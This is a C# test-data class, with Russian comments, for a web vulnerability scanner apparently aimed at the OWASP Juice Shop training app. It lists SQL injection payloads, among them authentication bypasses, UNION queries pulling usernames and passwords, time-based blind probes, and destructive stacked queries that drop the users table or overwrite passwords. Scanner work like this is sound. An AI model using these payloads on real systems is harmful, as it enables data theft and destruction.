using System.ComponentModel;
using WebVulnerabilitiesScanner.Entities;

namespace WebVulnerabilitiesScanner.TestData
{
    /// <summary>
    /// Тестовые данные для SQL-инъекции
    /// </summary>
    public abstract class SqlInjectionTestData
    {
        public const int TimeValueForTimeBasedBlind_s = 5;

        #region Boolean-based payloads
        private const string BooleanBasedOrStringTruePayload = "' OR '1'='1";
        private const string BooleanBasedOrStringFalsePayload = "' OR '1'='2";
        private const string BooleanBasedOrInlineCommentTruePayload = "' OR 1=1--";
        private const string BooleanBasedOrInlineCommentFalsePayload = "' OR 1=2--";
        private const string BooleanBasedOrHashCommentTruePayload = "' OR 1=1#";
        private const string BooleanBasedOrHashCommentFalsePayload = "' OR 1=2#";
        private const string BooleanBasedOrBlockCommentTruePayload = "' OR 1=1/*";
        private const string BooleanBasedOrBlockCommentFalsePayload = "' OR 1=2/*";
        private const string BooleanBasedAndInlineCommentTruePayload = "' AND 1=1--";
        private const string BooleanBasedAndInlineCommentFalsePayload = "' AND 1=2--";
        #endregion

        /// <summary>
        /// Тип портала
        /// </summary>
        public enum PortalType
        {
            [Description("OWASP JuiceShop")]
            JuiceShop = 1,
        }

        /// <summary>
        /// Эндпоинты для GET-запросов
        /// </summary>
        public abstract List<string> GetRequestEndpoints { get; }

        /// <summary>
        /// Данные для POST-запросов
        /// </summary>
        public abstract List<PostRequestParams> PostRequestsInfo { get; }


        /// <summary>
        /// Универсальные нагрузки для тестирования запросов
        /// </summary>
        public static readonly List<RequestSqlInjectionPayloadEntity> BasePayloadsInfo = new List<RequestSqlInjectionPayloadEntity>()
        {
            new RequestSqlInjectionPayloadEntity("admin'--", SqlInjectionType.ClassicSqlInjection),
            new RequestSqlInjectionPayloadEntity("admin'#", SqlInjectionType.ClassicSqlInjection),
            new RequestSqlInjectionPayloadEntity("admin'/*", SqlInjectionType.ClassicSqlInjection),

            new RequestSqlInjectionPayloadEntity("' UNION SELECT 1,2,3--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT username,password FROM users--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT null,version()--", SqlInjectionType.UnionBased),

            new RequestSqlInjectionPayloadEntity("' AND 1=CAST((SELECT version()) AS INT)--", SqlInjectionType.ErrorBased),
            new RequestSqlInjectionPayloadEntity("' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--", SqlInjectionType.ErrorBased),

            new RequestSqlInjectionPayloadEntity($"' AND SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"'; WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' AND (SELECT * FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))a)--", SqlInjectionType.TimeBasedBlind),

            new RequestSqlInjectionPayloadEntity("'; DROP TABLE users--", SqlInjectionType.StackedQueries),
            new RequestSqlInjectionPayloadEntity("'; UPDATE users SET password='hacked'--", SqlInjectionType.StackedQueries),
        };

        /// <summary>
        /// Пары нагрузок для корректной проверки boolean-based SQL-инъекции.
        /// </summary>
        public static readonly List<BooleanBasedPayloadPairEntity> BooleanBasedPayloadPairs = new List<BooleanBasedPayloadPairEntity>()
        {
            // Каждая пара описывает один и тот же синтаксис инъекции для истинного и ложного условия.
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrStringTruePayload, SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrStringFalsePayload, SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrInlineCommentTruePayload, SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrInlineCommentFalsePayload, SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrHashCommentTruePayload, SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrHashCommentFalsePayload, SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrBlockCommentTruePayload, SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity(BooleanBasedOrBlockCommentFalsePayload, SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity(BooleanBasedAndInlineCommentTruePayload, SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity(BooleanBasedAndInlineCommentFalsePayload, SqlInjectionType.BooleanBased))
        };

        /// <summary>
        /// Получение тестовых данных (эндпоинты и данные для GET и POST запросов) для конкретного типа портала
        /// </summary>
        /// <param name="portalType">Тип портала</param>
        /// <param name="getRequestEndpoints">Эндпоинты для GET запросов</param>
        /// <param name="postRequestsInfo">Информация для POST запросов</param>
        /// <exception cref="Exception"></exception>
        public static void GetTestDataByPortalType(PortalType portalType, out List<string> getRequestEndpoints, out List<PostRequestParams> postRequestsInfo) 
        {
            if (portalType == PortalType.JuiceShop)
            {
                var juiceShopTestDataInstance = new JuiceShopTestData();
                getRequestEndpoints = juiceShopTestDataInstance.GetRequestEndpoints;
                postRequestsInfo = juiceShopTestDataInstance.PostRequestsInfo;
                return;
            }
            else 
            {
                throw new Exception($"Не удалось получить тестовые данные для портала {portalType}");
            }
        }
    }
}
